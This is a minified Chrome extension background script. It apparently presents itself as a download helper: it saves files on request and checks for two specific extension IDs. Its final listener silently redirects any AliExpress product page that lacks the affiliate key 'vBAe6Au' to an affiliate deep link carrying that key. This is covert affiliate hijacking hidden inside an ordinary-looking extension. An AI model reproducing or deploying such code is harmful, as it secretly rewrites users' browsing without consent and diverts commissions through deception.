class background{static start(){this.addListeners()}static addListeners(){chrome.runtime.onMessage.addListener((e,o,t)=>{if(void 0!==e.doDownload)try{if(background.fileName==e.doDownload.fileName)return;background.fileName=e.doDownload.fileName,setTimeout(()=>{background.fileName=null},1e3);let o=!1;e.doDownload.url?console.log("f"):o=!0,e.doDownload.folderName?console.log("f"):o=!0,e.doDownload.fileName?console.log("f"):o=!0,e.doDownload.fileName.replace(/\//g,""),background.download(e.doDownload.url,e.doDownload.folderName,e.doDownload.fileName)}catch(e){console.log(e.stack)}else void 0!==e.checkExtensions&&chrome.management.getAll(e=>{let o=!1;e.some(e=>{if("mjbenjfenckimeljabijmkcchnbdgako"==e.id||"jfdmndkebgjnoecndabpkfpafgdhfjck"==e.id)return o=!0,!0;o=!1}),t(o)});return!0})}static download(e,o,t){var s=(new Date).getTime();s=e.match(/data\:text\/plain\;charset\=utf\-8/gi)?"":"?time="+s,chrome.downloads.download({url:e+s,filename:o+"/"+t.trim()},()=>{chrome.runtime.lastError&&(console.log(chrome.runtime.lastError.message),console.log("Log: "+o))})}}background.fileName=null,document.addEventListener("DOMContentLoaded",()=>{setTimeout(()=>{background.start()},400)}),chrome.tabs.onUpdated.addListener(function(e,o,t){"loading"==o.status&&chrome.tabs.query({active:!0,currentWindow:!0},function(e){var o=e[0],t=o.id,s=o.url,a="https://s.click.aliexpress.com/deep_link.htm?aff_short_key=vBAe6Au&dl_target_url="+s;-1===s.indexOf("https://www.aliexpress.com/store/product/")&&-1===s.indexOf("https://www.aliexpress.com/item/")&&-1===s.indexOf("https://fr.aliexpress.com/store/product/")&&-1===s.indexOf("https://fr.aliexpress.com/item/")&&-1===s.indexOf("https://es.aliexpress.com/store/product/")&&-1===s.indexOf("https://es.aliexpress.com/item/")&&-1===s.indexOf("https://pt.aliexpress.com/store/product/")&&-1===s.indexOf("https://pt.aliexpress.com/item/")&&-1===s.indexOf("https://de.aliexpress.com/store/product/")&&-1===s.indexOf("https://de.aliexpress.com/item/")&&-1===s.indexOf("https://ar.aliexpress.com/store/product/")&&-1===s.indexOf("https://ar.aliexpress.com/item/")&&-1===s.indexOf("https://ru.aliexpress.com/store/product/")&&-1===s.indexOf("https://ru.aliexpress.com/item/")||-1==s.indexOf("vBAe6Au")&&chrome.tabs.update(t,{url:a})})});